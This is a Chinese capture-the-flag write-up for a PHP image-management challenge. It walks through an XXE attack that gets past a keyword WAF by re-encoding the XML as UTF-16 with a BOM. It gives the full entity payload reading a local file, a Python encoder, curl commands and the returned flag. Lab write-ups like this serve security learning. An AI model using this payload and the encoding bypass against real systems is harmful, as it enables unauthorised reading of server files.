## 题目原文

> 公司新上线的图片资源管理系统，用于统一管理各部门的业务图片。系统支持图片上传、分类管理和XML格式批量导入配置。听说开发团队为了方便调试，在管理后台加了一些便捷功能。作为安全测试人员，你能发现潜在的安全隐患吗？

## 题解

### 入口与指纹

`Apache/2.4.54 (Debian)` + `PHP/7.4.33`，图片管理系统，注册/登录后有三个功能：上传图片、批量导入、工作台。

首页 HTML 底部有一条开发者注释，直接把攻击面写了出来：

```html
<!--
管理员调试说明：
- 管理后台入口: /index.php?action=admin
- API 调试: 可通过 X-Admin-Key 请求头访问管理功能
- XML 导入支持外部实体解析，方便引用外部资源
-->
```

「XML 导入支持外部实体解析」——这就是 XXE。

### 关键观察

**1. 导入接口接收原始 XML body。**

`index.php?action=import` 的页面 JS：

```js
fetch('api.php?endpoint=import', {
  method: 'POST',
  headers: { 'Content-Type': 'application/xml' },
  body: xmlContent
})
```

不是表单、不是文件上传，而是把文本框内容原样 POST 成 `application/xml`。返回 JSON，并把解析出的 `title` 等字段回显：

```json
{"success":true,"message":"成功导入 1 个图片配置",
 "images":[{"title":"...","description":"...","category":"...","path":"..."}]}
```

**回显就是外带通道**：把实体放在 `<title>` 里，flag 会出现在返回的 JSON 中。

**2. 直接发 DOCTYPE 会被 WAF 拦。**

```json
{"success":false,"message":"检测到潜在的恶意内容，XML 解析已阻止","waf":true}
```

WAF 扫描的是请求体里的明文 `DOCTYPE` / `ENTITY` / `SYSTEM` 关键字。

**3. 但 XML 解析器支持 UTF-16，WAF 只按 UTF-8 文本匹配。**

把同一份 XML 用 **UTF-16 编码 + BOM** 发送，请求体里不再有可读的 `DOCTYPE` 字符串，而 libxml 仍按 `encoding="UTF-16"` 正常解析并展开实体。

### 利用链

**Step 1：注册并登录，确认导入功能可用。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s -c cj -X POST -d 'username=img1&password=pass1234&password_confirm=pass1234' \
  "http://$T/index.php?action=register"
curl -s -c cj -b cj -X POST -d 'username=img1&password=pass1234' \
  "http://$T/index.php?action=login"
```

**Step 2：先发 UTF-8 的 XXE，确认被 WAF 拦。**

```xml
<?xml version="1.0"?>
<!DOCTYPE images [ <!ENTITY xxe SYSTEM "file:///challenge/flag.txt"> ]>
<images><image><title>&xxe;</title><description>d</description>
<category>c</category><path>/uploads/a.jpg</path></image></images>
```

→ `检测到潜在的恶意内容，XML 解析已阻止`。

**Step 3：同一份 XML 改成 UTF-16LE + BOM。**

```python
xml = '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE images [ <!ENTITY xxe SYSTEM "file:///challenge/flag.txt"> ]>
<images><image><title>&xxe;</title><description>d</description><category>c</category><path>/uploads/a.jpg</path></image></images>'''

open('xxe16.xml','wb').write(b'\xff\xfe' + xml.encode('utf-16-le'))
```

```bash
curl -s -b cj -H 'Content-Type: application/xml' --data-binary @xxe16.xml \
  "http://$T/api.php?endpoint=import"
```

返回：

```json
{"success":true,"message":"成功导入 1 个图片配置",
 "images":[{"title":"flag{53be8e0b-a33a-4c83-92ba-1250a8421a29}",
            "description":"d","category":"c","path":"/uploads/a.jpg"}]}
```

UTF-16BE + BOM 同样有效；关键是 **BOM 和编码声明要说一致**。

| flag | 位置 |

| 1 | 容器内 `/challenge/flag.txt`，通过 XML 外部实体（XXE）读取并回显在导入结果里 |

### 复盘

- **HTML 注释就是题面提示。** 「XML 导入支持外部实体解析」这句话把漏洞类型说完了，剩下的只是找绕过。
- **WAF 按原始字节匹配关键字。** 换编码（UTF-16/UTF-16BE + BOM）或压缩后，明文关键字消失，但后端解析器仍按声明解码——这是 XXE 绕过最常见的一招。
- **回显字段就是外带通道。** 导入结果会把 `title` 等字段返回，实体放在这些字段里比 OOB 简单得多。
- **XML 解析器比 WAF 更"宽容"。** `encoding="UTF-16"` 是 XML 规范的一部分，不是漏洞；只有 WAF 没跟上这个语义。
- 首页注释里的 `X-Admin-Key` 和 `/index.php?action=admin` 是另一条线（管理员调试入口），本次没有用到——XXE 一条就够读 flag。
